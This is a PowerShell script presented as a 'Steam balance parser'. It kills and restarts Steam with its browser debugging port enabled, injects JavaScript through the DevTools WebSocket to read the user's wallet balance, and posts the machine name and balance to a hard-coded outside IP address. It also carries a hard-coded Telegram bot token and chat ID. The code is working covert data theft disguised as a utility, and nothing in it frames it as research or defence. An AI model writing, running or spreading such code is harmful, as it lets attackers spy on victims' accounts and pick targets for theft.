param(
    [int]$Port = 8080,
    [string]$SteamPath = "C:\Program Files (x86)\Steam\steam.exe",
    [string]$TelegramBotToken = "8525982740:AAHj8V3rFo_o629srRi1vTl9C7XrkilL7u0",
    [string]$TelegramChatId = "7695288740"
)

Add-Type -AssemblyName System.Net.Http

Write-Host "`n=== STEAM BALANCE PARSER v9 ===" -ForegroundColor Cyan

# Send message to Telegram
function Send-TelegramMessage {
    param(
        [string]$Message,
        [string]$BotToken,
        [string]$ChatId
    )

    try {
        # Send through proxy server to handle encoding
        $url = "http://89.34.90.212:8000/text"
        $body = $Message

        $response = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "text/plain; charset=utf-8" -TimeoutSec 10
        return $true
    } catch {
        Write-Host "[WARN] Failed to send Telegram: $($_.Exception.Message)" -ForegroundColor Yellow
        return $false
    }
}

# Check if Steam is running with debug port
function Test-SteamDebugPort {
    try {
        $null = Invoke-RestMethod "http://127.0.0.1:$Port/json" -TimeoutSec 2 -ErrorAction Stop
        return $true
    } catch {
        return $false
    }
}

# Start Steam with debug port
function Start-SteamWithDebug {
    Write-Host "[i] Checking if Steam is running with debug port..." -ForegroundColor Cyan

    if (Test-SteamDebugPort) {
        Write-Host "[OK] Steam debug port is already available" -ForegroundColor Green
        return $true
    }

    Write-Host "[i] Steam debug port not available, restarting Steam..." -ForegroundColor Yellow

    Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Seconds 3

    if (Test-Path $SteamPath) {
        Write-Host "[i] Starting Steam with -cef-enable-debugging..." -ForegroundColor Cyan
        Start-Process -FilePath $SteamPath -ArgumentList "-cef-enable-debugging"

        $waited = 0
        while ($waited -lt 30) {
            Start-Sleep -Seconds 2
            $waited += 2
            Write-Host "[i] Waiting for Steam... ($waited/30 sec)" -ForegroundColor Gray

            if (Test-SteamDebugPort) {
                Write-Host "[OK] Steam started successfully!" -ForegroundColor Green
                Write-Host "[i] Waiting for Steam to fully load..." -ForegroundColor Cyan
                Start-Sleep -Seconds 10
                return $true
            }
        }

        Write-Host "[ERROR] Steam did not start in time" -ForegroundColor Red
        return $false
    } else {
        Write-Host "[ERROR] Steam not found at: $SteamPath" -ForegroundColor Red
        return $false
    }
}

# Main script
$computerName = $env:COMPUTERNAME
$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

Write-Host "[i] Computer: $computerName" -ForegroundColor Gray
Write-Host "[i] Time: $timestamp" -ForegroundColor Gray

if (-not (Start-SteamWithDebug)) {
    $errorMsg = "Name: $computerName`nError: Could not start Steam"
    Send-TelegramMessage -Message $errorMsg -BotToken $TelegramBotToken -ChatId $TelegramChatId
    exit 1
}

# Get tabs
$tabs = Invoke-RestMethod "http://127.0.0.1:$Port/json" -TimeoutSec 5
Write-Host "[i] Found $($tabs.Count) tabs" -ForegroundColor Gray

# Find "Steam" tab (main UI)
$steamTab = $tabs | Where-Object { $_.title -eq "Steam" } | Select-Object -First 1

if (!$steamTab) {
    Write-Host "[ERROR] Steam tab not found" -ForegroundColor Red
    $errorMsg = "Name: $computerName`nError: Steam tab not found"
    Send-TelegramMessage -Message $errorMsg -BotToken $TelegramBotToken -ChatId $TelegramChatId
    exit 1
}

Write-Host "[OK] Found Steam tab" -ForegroundColor Green

$ws = [System.Net.WebSockets.ClientWebSocket]::new()

try {
    $ws.ConnectAsync([Uri]$steamTab.webSocketDebuggerUrl, [Threading.CancellationToken]::None).Wait(5000) | Out-Null

    if ($ws.State -ne 'Open') {
        Write-Host "[ERROR] Could not connect to Steam tab" -ForegroundColor Red
        exit 1
    }

    Write-Host "[OK] WebSocket connected" -ForegroundColor Green

    # Get balance from wallet element
    $jsCode = @"
(function() {
    // Find wallet balance element by class
    var walletEl = document.querySelector('._2jphjrSifC6orDT4g_7Wd');
    if (walletEl) {
        return walletEl.textContent.trim();
    }
    return '';
})();
"@

    $evalMsg = @{
        id = 1
        method = "Runtime.evaluate"
        params = @{
            expression = $jsCode
            returnByValue = $true
        }
    } | ConvertTo-Json -Depth 10 -Compress

    $buffer = [System.Text.Encoding]::UTF8.GetBytes($evalMsg)
    $ws.SendAsync([ArraySegment[byte]]::new($buffer), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [Threading.CancellationToken]::None).Wait() | Out-Null

    Start-Sleep -Milliseconds 500

    $recv = New-Object byte[] 65535
    $result = $ws.ReceiveAsync([ArraySegment[byte]]::new($recv), [Threading.CancellationToken]::None).Result
    $json = [System.Text.Encoding]::UTF8.GetString($recv, 0, $result.Count)

    $data = $json | ConvertFrom-Json
    $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Done", [Threading.CancellationToken]::None).Wait()

    if ($data.result.result.value -and $data.result.result.value -ne '') {
        $walletBalance = $data.result.result.value

        Write-Host ""
        Write-Host "========================================" -ForegroundColor Green
        Write-Host "       STEAM WALLET BALANCE" -ForegroundColor Green
        Write-Host "========================================" -ForegroundColor Green
        Write-Host "  Balance: $walletBalance" -ForegroundColor Yellow
        Write-Host "========================================" -ForegroundColor Green
        Write-Host ""

        # Send to Telegram
        Write-Host "[i] Sending to Telegram..." -ForegroundColor Cyan

        $telegramMsg = "Name: $computerName`nBalance: $walletBalance"

        if (Send-TelegramMessage -Message $telegramMsg -BotToken $TelegramBotToken -ChatId $TelegramChatId) {
            Write-Host "[OK] Message sent to Telegram!" -ForegroundColor Green
        } else {
            Write-Host "[ERROR] Failed to send Telegram message" -ForegroundColor Red
        }

    } else {
        Write-Host "[ERROR] Balance element not found" -ForegroundColor Red
        $errorMsg = "Name: $computerName`nError: Balance element not found"
        Send-TelegramMessage -Message $errorMsg -BotToken $TelegramBotToken -ChatId $TelegramChatId
    }

} catch {
    Write-Host "[ERROR] Failed: $($_.Exception.Message)" -ForegroundColor Red
    if ($ws.State -eq 'Open') {
        $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Error", [Threading.CancellationToken]::None).Wait()
    }
    exit 1
}

Write-Host ""
